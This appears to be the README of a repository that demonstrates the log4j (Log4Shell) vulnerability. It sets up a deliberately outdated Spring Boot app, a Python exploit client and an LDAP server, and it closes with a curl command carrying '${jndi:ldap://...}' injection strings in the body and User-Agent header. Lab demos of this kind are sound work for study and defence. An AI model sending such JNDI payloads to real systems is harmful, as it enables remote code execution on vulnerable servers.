This repository contains a demo of the log4j vulnerability that got large attention in december 2021.

The demo consists of three different parts:<br>
The first part is a Spring Boot application. This application is based on an older version of Spring Boot and an older version of log4j.<br>
The second part is a simple client written in Python. This client can be used to make REST calls to exploit the vulnerability.<br>
The third part is an LDAP server. It is not included in this repository. Instead you can find it [here](https://github.com/rakutentech/jndi-ldap-test-server)

# Building and running the Spring Boot application locally
Simply run `mvn clean install` and start it then either in IntelliJ or by running `java -jar target/<name>.jar`

# Running the application in Docker
Alternatively, the application can run in a Docker container. Simply run `docker-compose up --build` from the project root.<br>
When running in Docker, there is even a simple Grafana board available at http://localhost:3000.

# Running the Python client
The Python client is based on version 3.9. Just run `python3 <filename.py>` from the `client` folder.



how to configure openldap

how to start openldap
sudo /usr/libexec/slapd -d3

ldapsearch -H ldap://localhost:389/test -x


curl command
curl -v -X POST http://localhost:8080/post -d '${jndi:ldap://my-domain:389/localhost}' -H 'User-Agent: ${jndi:ldap://localhost:389}'
